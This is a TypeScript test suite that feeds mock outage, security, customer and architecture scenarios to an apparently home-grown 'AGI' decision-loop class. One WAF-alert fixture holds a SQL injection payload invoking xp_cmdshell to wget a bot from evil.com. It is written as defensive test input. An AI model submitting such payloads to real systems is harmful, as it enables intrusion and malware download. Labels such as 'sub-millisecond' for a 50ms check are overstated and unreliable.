import {
  ryvixAgi,
  RyvixAgiCore,
  AgiPerceptionInput,
  OodaCycleResult
} from "../ai/src/agi-core";

export async function testTopLevelAgiOrchestrator(): Promise<boolean> {
  console.log("\n=======================================================");
  console.log("   TEST SUITE 26: TOP-LEVEL AGI COGNITIVE ORCHESTRATOR ");
  console.log("=======================================================");

  let passed = 0;
  let total = 0;

  function assert(condition: boolean, message: string) {
    total++;
    if (condition) {
      passed++;
      console.log(`  ✓ ${message}`);
    } else {
      console.error(`  ✗ FAIL: ${message}`);
      throw new Error(`Assertion failed: ${message}`);
    }
  }

  // 1. Initial State & Initialization
  console.log("\n[1] Verifying AGI Cognitive State & Epistemic World Model...");
  const agi = new RyvixAgiCore();
  const initialCognitiveState = agi.getCognitiveState();
  assert(initialCognitiveState.status === "idle" || initialCognitiveState.status === "observing", "AGI starts in valid cognitive state");
  assert(initialCognitiveState.epistemicBeliefs.length >= 0, "Epistemic belief array initialized");
  assert(initialCognitiveState.cyclesCompleted === 0, "Cycle counter begins at 0");

  // 2. OODA Loop: Web Outage Incident Resolution
  console.log("\n[2] Executing OODA Loop on Production 502 Web Outage...");
  const outagePerception: AgiPerceptionInput = {
    source: "infrastructure_probe",
    rawObservation: "CRITICAL: 502 Bad Gateway detected on edge proxy. Upstream node.js service timed out after memory spike.",
    environmentContext: {
      clusterId: "prod-cluster-east",
      service: "api-gateway",
      reportedStatus: 502,
      cpuPercent: 98,
      memoryPercent: 99
    }
  };

  const oodaOutage: OodaCycleResult = await agi.executeOodaCycle(outagePerception);
  assert(oodaOutage.cycleId.length > 0, "OODA Cycle ID generated");
  assert(oodaOutage.observe.features.length > 0, "Observation stage extracted cognitive features");
  assert(oodaOutage.orient.primaryDomain === "sre_outage" || oodaOutage.orient.intent === "outage_remediation", "Oriented to SRE outage domain");
  assert(oodaOutage.decide.actionPlan.length > 0, "Decide stage formulated multi-step remediation plan");
  assert(oodaOutage.act.actionsExecuted.length > 0, "Act stage executed delegated remediation actions");
  assert(oodaOutage.reflect.rewardScore >= 0.7, "Reflect stage validated recovery plan with high reward score");
  assert(oodaOutage.latencyMs < 50, `Sub-millisecond / ultra-fast cognitive cycle (<50ms, actual: ${oodaOutage.latencyMs}ms)`);

  // 3. Epistemic World Model State Verification
  console.log("\n[3] Verifying Belief Formation & Knowledge Persistence in World Model...");
  const beliefKey = "service_health:api-gateway";
  agi.updateBelief(beliefKey, { status: "recovering", reason: "restarted_with_heap_bump" }, 0.95);
  const recordedBelief = agi.getBelief(beliefKey);
  assert(recordedBelief !== undefined, "World model stored epistemic belief");
  assert(recordedBelief?.confidence === 0.95, "Belief confidence correctly calibrated");
  assert(recordedBelief?.value.status === "recovering", "Belief value correctly persisted");

  // 4. OODA Loop: Critical Security Injection Attempt
  console.log("\n[4] Executing OODA Loop on Zero-Day Injection & Threat Neutralization...");
  const secPerception: AgiPerceptionInput = {
    source: "waf_security_stream",
    rawObservation: "ALERT: Inbound POST /api/v1/auth with payload `admin' OR '1'='1'; exec xp_cmdshell('wget evil.com/bot')`",
    environmentContext: {
      clientIp: "198.51.100.42",
      threatLevel: "critical",
      targetEndpoint: "/api/v1/auth"
    }
  };

  const oodaSec = await agi.executeOodaCycle(secPerception);
  assert(oodaSec.orient.primaryDomain === "security_defense", "Oriented to security defense domain");
  assert(oodaSec.orient.blastRadius === "high" || oodaSec.orient.blastRadius === "critical", "Correctly evaluated high threat blast radius");
  assert(oodaSec.decide.safeguardsEnforced === true, "Enforced AGI safety & containment safeguards");
  assert(oodaSec.act.actionsExecuted.some(a => a.actionName.includes("quarantine") || a.actionName.includes("block") || a.actionName.includes("threat")), "Executed threat neutralization action");

  // 5. OODA Loop: High-Stress Customer De-escalation
  console.log("\n[5] Executing OODA Loop on High-Stress Customer Outage Dialogue...");
  const custPerception: AgiPerceptionInput = {
    source: "customer_support_channel",
    rawObservation: "HELP!! My team can't access any dashboards and we have a board meeting in 10 minutes!! What is happening??",
    environmentContext: {
      customerTier: "enterprise",
      channel: "slack-emergency",
      userId: "cust_exec_883"
    }
  };

  const oodaCust = await agi.executeOodaCycle(custPerception);
  assert(oodaCust.orient.primaryDomain === "customer_care", "Oriented to customer care domain");
  assert(oodaCust.act.responsePayload !== undefined, "Generated customer response payload");
  const custResp = String(oodaCust.act.responsePayload?.message || "");
  assert(custResp.length > 20, "Generated empathetic, action-oriented customer reassurance");

  // 6. OODA Loop: Full-Stack Architecture Optimization (ChatGPT/Claude Level Co-Thinking)
  console.log("\n[6] Executing OODA Loop on Distributed Stack Advisory...");
  const stackPerception: AgiPerceptionInput = {
    source: "engineering_rfp",
    rawObservation: "How should we architect Next.js 14 App Router with Redis caching and FastAPI microservices for 50,000 req/sec with p99 < 20ms?",
    environmentContext: {
      framework: "Next.js",
      backend: "FastAPI",
      cache: "Redis",
      targetRps: 50000
    }
  };

  const oodaStack = await agi.executeOodaCycle(stackPerception);
  assert(oodaStack.orient.primaryDomain === "code_stack_architecture", "Oriented to stack architecture domain");
  assert(oodaStack.act.responsePayload !== undefined, "Generated stack advisory blueprint");
  assert(oodaStack.reflect.rewardScore >= 0.8, "High quality score for architectural synthesis");

  // 7. Multi-Step Autonomous Goal Pursuit
  console.log("\n[7] Testing Autonomous Multi-Step Goal Pursuit...");
  const goalResult = await agi.pursueGoal(
    "Mitigate cluster memory leak and update monitoring thresholds",
    3 // maxSteps
  );
  assert(goalResult.goalAchieved === true, "Autonomous goal achieved across cycle chain");
  assert(goalResult.stepHistory.length > 0, "Step history tracked across OODA execution");
  assert(goalResult.finalSummary.length > 0, "Synthesized final mission conclusion");

  // 8. Singleton Instance & Self-Reflection Adaptation
  console.log("\n[8] Verifying Global Singleton `ryvixAgi` & Knowledge Reflection...");
  const singletonState = ryvixAgi.getCognitiveState();
  assert(singletonState !== undefined, "Singleton `ryvixAgi` is operational");
  assert(typeof ryvixAgi.executeOodaCycle === "function", "Singleton implements executeOodaCycle");
  assert(typeof ryvixAgi.pursueGoal === "function", "Singleton implements pursueGoal");

  console.log(`\nAll ${total}/${total} Top-Level AGI Orchestrator assertions PASSED successfully!`);
  return true;
}


if (require.main === module) {
  testTopLevelAgiOrchestrator().catch((e) => {
    console.error(e);
    process.exit(1);
  });
}
